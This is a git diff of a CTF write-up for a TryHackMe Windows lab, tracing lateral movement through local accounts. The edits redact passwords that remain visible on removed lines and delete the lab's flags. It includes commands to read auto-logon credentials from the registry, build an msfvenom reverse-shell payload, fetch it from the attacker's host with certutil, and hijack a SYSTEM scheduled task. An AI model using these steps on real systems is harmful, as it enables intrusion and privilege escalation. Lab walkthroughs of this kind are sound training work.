@@ -1,4 +1,6 @@
-# 🧩 **WindowsJump — CTF‑Style Write‑Up
+# **WindowsJump — CTF‑Style Write‑Up**
+
+Room Url: https://tryhackme.com/room/windowsjump
 
 ## **1. Overview**
 *WindowsJump* is a Windows‑based CTF machine designed around **sequential lateral movement** through multiple local accounts, each exposing a small misconfiguration that enables the next escalation step.
@@ -29,7 +31,7 @@ A publicly accessible share was available.
 After connecting and performing basic enumeration, I discovered credentials stored inside the share:
 
 - **Username:** `thmuser`  
-- **Password:** `Password1!`
+- **Password:** ---Redacted---
 
 ### **Exploitation**
 Using these credentials, I connect to the RDP server:
@@ -56,7 +58,7 @@ reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
 
 The registry revealed a saved auto‑logon entry for:
 - **Username:** `notadmin`  
-- **Password:** `P@ssw0rd!`
+- **Password:** ---Redacted---
 
 ### **Exploitation**
 I used the credentials with:
@@ -125,12 +127,12 @@ This executed my payload and returned a shell as:
 
 ### **Enumeration**
 I enumerated scheduled tasks:
-
 ```
 schtasks /query /fo list /v | findstr /R "^TaskName: ^Task To Run: ^Run As User:"
 ```
+found nothing interesting.
 
-i noticed a task running as **SYSTEM** and poiting to an unsual binary path:
+I proceeded to look at C:\Windows\Tasks folder, where scheduled tasks scripts are often stored, and i found:
 ```
 C:\Windows\Tasks\cleanup.bat
 ```
@@ -145,12 +147,12 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<my_ip> LPORT=5555 -f exe -o she
 
 I hosted it and downloaded it to the target:
 ```
-wget http://<my_ip>:8000/shell.exe -O C:\Users\svcadmin\shell.exe
+certutil -urlcache -split -f http://<my ip>:8000/shell.exe C:\Users\svcadmin.privesc\shell.exe
 ```
 
 Then granted full permissions:
 ```
-icacls C:\Users\svcadmin\shell.exe /grant everyone:F
+icacls C:\Users\svcadmin.privesc\shell.exe /grant everyone:F
 ```
 
 Finally, I replaced the scheduled task’s batch file content:
@@ -166,13 +168,7 @@ nc -lvnp 5555
 I waited for the scheduled task to execute, and it delivered a SYSTEM shell.
 I completed the chain with full control over the machine.
 -------
-# 7. **Flags**
-thmuser: THM{5mb_cr3d5_1n_th3_5h4r3}
-notadmin: THM{w1nl0g0n_cr3ds_3xp0s3d}
-svcadmin: THM{s3rv1c3_b1n4ry_h1j4ck3d}
-system: THM{t4sk_wr1t3_t0_SYST3M}
 
----
 
 # **6. Lessons Learned**
 - SMB shares often leak sensitive credentials when misconfigured.  
